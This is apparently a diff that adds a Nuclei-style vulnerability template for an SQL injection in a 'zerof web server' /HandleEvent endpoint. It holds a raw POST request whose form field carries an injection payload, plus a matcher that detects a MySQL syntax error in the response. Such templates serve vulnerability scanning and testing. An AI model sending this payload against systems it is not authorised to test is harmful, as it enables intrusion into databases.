@@ -1,0 +1,39 @@
+id: zerof-web-server-handleevent-sqli
+
+info:
+  name: zerof web server SQL注入
+  author: Master先生
+  severity: high
+  tags: zerof-web-server,sqli
+
+requests:
+  - raw:
+      - |
+        POST /HandleEvent HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 155
+        Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+        Sec-Ch-Ua-Platform: "macOS"
+        Accept: */*
+        Origin: https://{{Hostname}}
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: https://{{Hostname}}/
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        Ajax=1&IsEvent=1&Obj=O4F&Evt=click&this=O4F&"_fp_=_S_ID=mQ5Fu33Xvo109ED63C3&O33= 0  '('--(SELECT @@version&O37= 0  11111"&_seq_=2&_uo_=O0
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200"
+          - "contains((body), 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near')"
+        condition: and
